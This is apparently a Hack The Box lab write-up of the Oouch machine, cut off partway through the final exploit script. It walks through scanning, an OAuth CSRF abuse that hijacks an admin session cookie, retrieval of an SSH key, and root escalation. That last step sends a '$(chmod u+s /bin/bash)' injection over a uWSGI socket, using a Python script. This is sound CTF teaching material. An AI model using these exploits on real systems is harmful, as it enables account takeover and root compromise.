<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Oouch - Hack The Box - hackcommander.io</title>
<meta name="description" content="Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi socket directly to manipulate the REMOTE_ADDR variable and exploit a command injection vulnerability in the script calling iptables.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Oouch - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-oouch/">


  <meta property="og:description" content="Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi socket directly to manipulate the REMOTE_ADDR variable and exploit a command injection vulnerability in the script calling iptables.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-oouch/oouch_logo.png">





  <meta property="article:published_time" content="2020-08-01T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-oouch/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Oouch - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Oouch - Hack The Box">
    <meta itemprop="description" content="Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi socket directly to manipulate the REMOTE_ADDR variable and exploit a command injection vulnerability in the script calling iptables.">
    <meta itemprop="datePublished" content="August 01, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Oouch - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-08-01T00:00:00+02:00">August 01, 2020 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-oouch/oouch_logo.png" alt="" /></p>

<p>Ooauth was a pretty tough box because I was unfamiliar with Oauth and it took a while to figure out the bits and pieces to chain together. The priv esc was pretty cool, we had to talk to the uwsgi socket directly to manipulate the <code class="language-plaintext highlighter-rouge">REMOTE_ADDR</code> variable and exploit a command injection vulnerability in the script calling iptables.</p>

<h2 id="portscan">Portscan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/ouch# nmap -p- 10.10.10.177
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 15:58 EST
Nmap scan report for oouch.htb (10.10.10.177)
Host is up (0.019s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp
8000/tcp open  http-alt
</code></pre></div></div>

<h2 id="ftp-server">FTP server</h2>

<p>The FTP server allows anonymous access and contains a single file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/ouch# ftp 10.10.10.177
Connected to 10.10.10.177.
220 qtc's development server
Name (10.10.10.177:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            49 Feb 11 18:34 project.txt
226 Directory send OK.
</code></pre></div></div>

<p>The file contains some information about what kind of web technology runs the two web services we saw earlier on port 5000 and 8000.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/ouch# cat project.txt 
Flask -&gt; Consumer
Django -&gt; Authorization Server
</code></pre></div></div>

<h2 id="web-site-enumeration">Web site enumeration</h2>

<p>The site on port 5000 requires an account to log in but fortunately we can register a new account.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_1.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_2.png" alt="" /></p>

<p>After logging in, we have access to a couple of different pages.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_3.png" alt="" /></p>

<p>The user profile section shows that no account has been connected but we’re not sure what this is yet.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_4.png" alt="" /></p>

<p>The documents area is still under construction and is only available to administrators.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_5.png" alt="" /></p>

<p>There’s also a contact section. Now that’s pretty interesting because it could be a target for an XSS since the page says the messages are forwarded to the administrator.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_6.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_7.png" alt="" /></p>

<h2 id="xss-on-the-contact-form">XSS on the contact form</h2>

<p>There is some filtering done on the message input and we get blacklisted for about a minute whenever we try payloads that contain blacklisted words like: <code class="language-plaintext highlighter-rouge">alert</code>, <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>, etc.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_8.png" alt="" /></p>

<p>The funny part of this XSS is that it’s not really a real XSS where javascript is executed in the victim’s browser. Here we don’t even need to send a javascript payload, the XSS bot is configured to following whatever link we give it so entering <code class="language-plaintext highlighter-rouge">http://10.10.14.21</code> generates a callback on our VM.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_9.png" alt="" /></p>

<p>This XSS will come in handy later, for now we’ll move on to directory and file bruteforcing to find additional stuff on the webserver.</p>

<h2 id="gobuster">Gobuster</h2>

<p>Using gobuster, we found an interesting <code class="language-plaintext highlighter-rouge">/oauth</code> directory:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/htb/ouch# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -u http://10.10.10.177:5000
[...]
/about (Status: 302)
/contact (Status: 302)
/documents (Status: 302)
/home (Status: 302)
/login (Status: 200)
/logout (Status: 302)
/oauth (Status: 302)
/profile (Status: 302)
/register (Status: 200)
</code></pre></div></div>

<h2 id="oauth-consumer-server">Oauth consumer server</h2>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_10.png" alt="" /></p>

<p>The connect page presents another login prompt but this requires a different account, probably an account that will need to be linked to our main profile.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_11.png" alt="" /></p>

<h2 id="oauth-authorization-server">Oauth authorization server</h2>

<p>That web server running on port 8000 is the Oauth authorization server and we can create the account there.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_12.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_13.png" alt="" /></p>

<p>Once we go back to the connect page, we can authorize the application as follows.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_14.png" alt="" /></p>

<p>Then the new account gets linked to the consumer server.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_15.png" alt="" /></p>

<p>Unfortunately that doesn’t give us anything new since our account is not an administrator.</p>

<h2 id="xss-to-authorize-as-administrator">XSS to authorize as administrator</h2>

<p>When we examine the Burp history from the authorization process, we see the following in the POST request to the authorization server:</p>

<ul>
  <li>The client_id is static. This is the application ID configured on the authorization server.</li>
  <li>The response_type code tells the authorization what kind of authorization ‘token’ should be used.</li>
  <li>The redirect_uri is self-explanatory, if we could change this we could steal the administrator’s session ID cookie but it’s configured on the authorization server as part of the application configuration and we cannot change it.</li>
  <li>By experimentation we can find that the CSRF token isn’t even used / verified.</li>
</ul>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_16.png" alt="" /></p>

<p>The next GET request to the consumer just uses the token code that was returned by the authorization server. This will bind the accounts together on the consumer server.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_17.png" alt="" /></p>

<p>What we need to do here is have an administrator submit the token code that the authorization server returned to us and that will give us administrator privileges on that application. We must drop the initial request our client makes though because the code can only be used once. Using the contact form we can perform the SSRF to get the admin to authorize us.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_18.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_19.png" alt="" /></p>

<p>That part is kinda weird, it didn’t work the first time, I had to do it a couple of times and eventually got it working and was able to get to the documents section.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_20.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_21.png" alt="" /></p>

<p>The documents has the <code class="language-plaintext highlighter-rouge">develop:supermegasecureklarabubu123!</code> credentials and an API endpoint <code class="language-plaintext highlighter-rouge">/api/get_user</code></p>

<p>The next hint is also important as it tells us we can get SSH keys.</p>

<h2 id="enumerating-the-oauth-and-api-endpoints-on-the-authorization-server">Enumerating the Oauth and API endpoints on the authorization server</h2>

<p>There’s a <code class="language-plaintext highlighter-rouge">/oauth/applications</code> directory but even with the credentials above we can’t get passed the HTTP basic authentication.</p>

<p>The hint talked about applications registration so by using the following link we can get to the app registration page:</p>

<p><code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/oauth/applications/register/</code></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_22.png" alt="" /></p>

<p>Now that we can add applications, we can exploit the redirect_uri and use the XSS again to steal the administrator’s sessionid cookie.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_23.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_24.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_25.png" alt="" /></p>

<p>The python SimpleHTTPServer module doesn’t display the headers by default so we’ll just use Wireshark to see the Cookie HTTP header.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_26.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_27.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">sessionid=ir2kgnr7ih1q5h6ccbnj0a423lq7egfs</code></p>

<h2 id="getting-the-ssh-credentials-using-the-api">Getting the SSH credentials using the API</h2>

<p>Now that we got the cookie, we can just use it to log in as qtc.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_28.png" alt="" /></p>

<p>To get a token for the API endpoints, we’ll first register a new application with <code class="language-plaintext highlighter-rouge">Client credentials</code> as the Authorization grant type.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_29.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_30.png" alt="" /></p>

<p>Note of the credentials:</p>
<ul>
  <li>client id: <code class="language-plaintext highlighter-rouge">dqzxtaT48HybcM5YtruDCjCjuOSQzVdhg1eHyhiN</code></li>
  <li>client secret: <code class="language-plaintext highlighter-rouge">rSzD9UWKG1wI4GUmAuchsFm8jYP5M1TsxpLdhSTczNbIgJxkebFCRmeUbvW1FdNqUNhzrkjoMpFZtjONYi597mHyzpIYOTdaqKUJgdLoADqnGTTc8TdIpwPdtriWYTBU</code></li>
</ul>

<p>Using the <code class="language-plaintext highlighter-rouge">/oauth/token</code>, we can log in with the application credentials and get an access_token.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_31.png" alt="" /></p>

<p>Using the Authorization token we can use the API and see that we’re user <code class="language-plaintext highlighter-rouge">qtc</code></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_33.png" alt="" /></p>

<p>After some fuzzing based on the SSH hint earlier, we found the <code class="language-plaintext highlighter-rouge">get_ssh</code> endpoint which returns the SSH key for user <code class="language-plaintext highlighter-rouge">qtc</code></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_32.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_34.png" alt="" /></p>

<h2 id="privesc">Privesc</h2>

<p>That SSH shell is on the host and we see that the two web servers are running in different containers.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_35.png" alt="" /></p>

<p>After uploading pspy we can check if any processes are running in a cronjob.</p>

<p>We see here that iptables is used to blacklist our IP when we trigger the XSS filter and that there’s a <code class="language-plaintext highlighter-rouge">get_pwnd</code> script that runs. This script is probably the XSS bot that fetches the URL submitted on the contact form.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_36.png" alt="" /></p>

<p>There’s a dbus configuration that accept messages from the <code class="language-plaintext highlighter-rouge">www-data</code> user. This is probably used to pass messages between the container and the host containing the IPs to be blocked by iptables. This a command injection vector if we can control the IP address sent to the iptables command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf 
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!-- -*- XML -*- --&gt;

&lt;!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;

&lt;busconfig&gt;

    &lt;policy user="root"&gt;
        &lt;allow own="htb.oouch.Block"/&gt;
    &lt;/policy&gt;

	&lt;policy user="www-data"&gt;
		&lt;allow send_destination="htb.oouch.Block"/&gt;
		&lt;allow receive_sender="htb.oouch.Block"/&gt;
	&lt;/policy&gt;

&lt;/busconfig&gt;
</code></pre></div></div>

<p>We can SSH directly to the container running the web application.</p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_37.png" alt="" /></p>

<p>The application resides in <code class="language-plaintext highlighter-rouge">/code</code>. The interesting bit for us now is the contact form code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">contact</span><span class="p">():</span>
    <span class="s">'''
    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.
    The messages are scanned for valid url's and these urls are saved to a file on disk. A cronjob will view the files regulary and
    invoke requests on the corresponding urls.

    Parameters:
        None

    Returns:
        render                (Render)                  Renders the contact page.
    '''</span>
    <span class="c1"># First we need to load the contact form
</span>    <span class="n">form</span> <span class="o">=</span> <span class="n">ContactForm</span><span class="p">()</span>

    <span class="c1"># If the form was already submitted, we process the contents
</span>    <span class="k">if</span> <span class="n">form</span><span class="p">.</span><span class="n">validate_on_submit</span><span class="p">():</span>

        <span class="c1"># First apply our primitive xss filter
</span>        <span class="k">if</span> <span class="n">primitive_xss</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">textfield</span><span class="p">.</span><span class="n">data</span><span class="p">):</span>
            <span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">SystemBus</span><span class="p">()</span>
            <span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="n">get_object</span><span class="p">(</span><span class="s">'htb.oouch.Block'</span><span class="p">,</span> <span class="s">'/htb/oouch/Block'</span><span class="p">)</span>
            <span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="s">'htb.oouch.Block'</span><span class="p">)</span>

            <span class="n">client_ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'REMOTE_ADDR'</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">)</span>  
            <span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="p">.</span><span class="n">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
            <span class="n">bus</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'hacker.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">'Hacker'</span><span class="p">)</span>

        <span class="c1"># The regex defined at the beginning of this file checks for valid urls
</span>        <span class="n">url</span> <span class="o">=</span> <span class="n">regex</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">textfield</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">url</span><span class="p">:</span>

            <span class="c1"># If an url was found, we try to save it to the file /code/urls.txt
</span>            <span class="k">try</span><span class="p">:</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/code/urls.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">url_file</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nb">file</span><span class="o">=</span><span class="n">url_file</span><span class="p">)</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="s">"Error while openeing 'urls.txt'"</span><span class="p">)</span>

        <span class="c1"># In any case, we inform the user that has message has been sent
</span>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'contact.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">'Contact'</span><span class="p">,</span> <span class="n">send</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>

    <span class="c1"># Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
</span>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'contact.html'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s">'Contact'</span><span class="p">,</span> <span class="n">send</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
</code></pre></div></div>

<p>In a nutshell, when the XSS filter is triggered, the application uses the <code class="language-plaintext highlighter-rouge">REMOTE_ADDR</code> parameter to send it through the dbus interface to the upstream iptables command. We can’t spoof or modify this <code class="language-plaintext highlighter-rouge">REMOTE_ADDR</code> variable remotely so we’ll have to exploit this another way.</p>

<p>The <code class="language-plaintext highlighter-rouge">uwsgi.ini</code> file shows that a UNIX socket is used to communicate between the webserver and the flask application:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
</code></pre></div></div>

<p>The permissions on the socket allow us to read and write to the socket:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qtc@aeb4525789d8:/code$ ls -l /tmp
total 0
srw-rw-rw- 1 www-data www-data 0 Mar  2 15:21 uwsgi.socket
</code></pre></div></div>

<p>We can write using the uwsgi protocol directly to the socket and manipulate the values. The code below is an ugly hack put together from some examples found online. The payload I used here sets the SUID bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code>: <code class="language-plaintext highlighter-rouge">$(chmod u+s /bin/bash)</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span>

<span class="k">assert</span> <span class="n">sys</span><span class="p">.</span><span class="n">version_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="s">'Use Python 3.'</span>


<span class="k">def</span> <span class="nf">force_bytes</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">value</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">encode_uwsgi_vars</span><span class="p">(</span><span class="n">values</span><span class="p">):</span>
    <span class="s">"""
    Encode a list of key-value pairs into an uWSGI request header structure.
    """</span>
    <span class="c1"># See http://uwsgi-docs.readthedocs.io/en/latest/Protocol.html#the-uwsgi-vars
</span>    <span class="nb">buffer</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
        <span class="n">key_enc</span> <span class="o">=</span> <span class="n">force_bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">val_enc</span> <span class="o">=</span> <span class="n">force_bytes</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="nb">buffer</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;H'</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_enc</span><span class="p">)))</span>
        <span class="nb">buffer</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">key_enc</span><span class="p">)</span>
        <span class="nb">buffer</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;H'</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">val_enc</span><span class="p">)))</span>
        <span class="nb">buffer</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">val_enc</span><span class="p">)</span>
    <span class="k">return</span> <span class="sa">b</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">send_uwsgi_request</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="n">header_content</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">encode_uwsgi_vars</span><span class="p">(</span><span class="n">header_content</span><span class="p">)</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span>
        <span class="s">'&lt;BHB'</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>  <span class="c1"># modifier1: 0 - WSGI (Python) request
</span>        <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span>  <span class="c1"># data size
</span>        <span class="mi">0</span><span class="p">,</span>  <span class="c1"># modifier2: 0 - always zero
</span>    <span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
    <span class="n">socket</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">header</span><span class="p">)</span>
    <span class="n">socket</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="s">'csrf_token=Ijg3YjgyMTRhNDQxZTJhNWUyMTQ1NGI1OTIzYjNjOGEyYzAzMDFkMGQi.Xlv6qg.cxrU6xp-WQWDDj5_IzD-iF3D-70&amp;textfield=alert&amp;submit=Send'</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">dump_from_socket</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">32</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">width</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'%-*s  %s'</span> <span class="o">%</span> <span class="p">(</span>
            <span class="n">width</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span>
            <span class="n">hexlify</span><span class="p">(</span><span class="n">chunk</span><span class="p">).</span><span class="n">decode</span><span class="p">(),</span>
            <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">b</span> <span class="k">if</span> <span class="n">b</span><span class="p">.</span><span class="n">isprintable</span><span class="p">()</span> <span class="k">else</span> <span class="s">'.'</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">chunk</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">,</span> <span class="s">'replace'</span><span class="p">))</span>
        <span class="p">))</span>


<span class="k">def</span> <span class="nf">talk_to_uwsgi</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
    <span class="c1">#s = socket.socket()
</span>    <span class="c1">#s.connect((host, port))
</span>    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="s">"/tmp/uwsgi.socket"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">send_uwsgi_request</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">{</span>
